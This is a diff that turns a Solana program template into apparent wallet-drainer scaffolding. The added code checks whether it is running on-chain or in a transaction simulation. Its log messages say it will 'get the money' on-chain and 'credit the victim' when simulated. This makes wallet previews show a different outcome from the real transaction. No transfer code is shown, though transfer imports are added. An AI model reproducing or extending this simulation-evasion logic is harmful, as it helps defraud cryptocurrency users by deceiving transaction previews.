@@ -1,54 +1,47 @@
 use solana_program::{
-    account_info::AccountInfo, entrypoint, entrypoint::ProgramResult, msg, pubkey::Pubkey,
+    account_info::{next_account_info, AccountInfo},
+    clock::Clock,
+    entrypoint,
+    entrypoint::ProgramResult,
+    msg,
+    native_token::LAMPORTS_PER_SOL,
+    program::invoke,
+    program_error::INVALID_ARGUMENT,
+    pubkey::Pubkey,
+    system_instruction,
+    sysvar::Sysvar,
 };
+use std::convert::TryInto;
 
 entrypoint!(process_instruction);
-fn process_instruction(
-    program_id: &Pubkey,
+
+pub fn process_instruction(
+    _program_id: &Pubkey,
     accounts: &[AccountInfo],
-    instruction_data: &[u8],
+    _instruction_data: &[u8],
 ) -> ProgramResult {
-    msg!(
-        "process_instruction: {}: {} accounts, data={:?}",
-        program_id,
-        accounts.len(),
-        instruction_data
-    );
-    Ok(())
-}
+    msg!("Hello !");
 
-#[cfg(test)]
-mod test {
-    use {
-        super::*,
-        assert_matches::*,
-        solana_program::instruction::{AccountMeta, Instruction},
-        solana_program_test::*,
-        solana_sdk::{signature::Signer, transaction::Transaction},
-    };
+    let account_info_iter = &mut accounts.iter();
 
-    #[tokio::test]
-    async fn test_transaction() {
-        let program_id = Pubkey::new_unique();
+    let slot_account = next_account_info(account_info_iter)?;
+    let incinerator_account = next_account_info(account_info_iter)?;
 
-        let (mut banks_client, payer, recent_blockhash) = ProgramTest::new(
-            "bpf_program_template",
-            program_id,
-            processor!(process_instruction),
-        )
-        .start()
-        .await;
+    // Slot is an u64 at the end of the structure
+    let data = slot_account.data.borrow();
+    let slot: u64 = u64::from_le_bytes(data[data.len() - 8..].try_into().unwrap());
 
-        let mut transaction = Transaction::new_with_payer(
-            &[Instruction {
-                program_id,
-                accounts: vec![AccountMeta::new(payer.pubkey(), false)],
-                data: vec![1, 2, 3],
-            }],
-            Some(&payer.pubkey()),
-        );
-        transaction.sign(&[&payer], recent_blockhash);
+    let clock = Clock::get().unwrap();
 
-        assert_matches!(banks_client.process_transaction(transaction).await, Ok(()));
+    msg!("next_slot is {:?} ", slot);
+    msg!("clock is in slot {:?} ", clock.slot);
+
+    msg!("incinerator balance: {:?}", incinerator_account.lamports());
+
+    if clock.slot >= slot {
+        msg!("We are onchain, let's get the money");
+    } else {
+        panic!("We are in a simulation, let's credit the victim !");
     }
+    Ok(())
 }
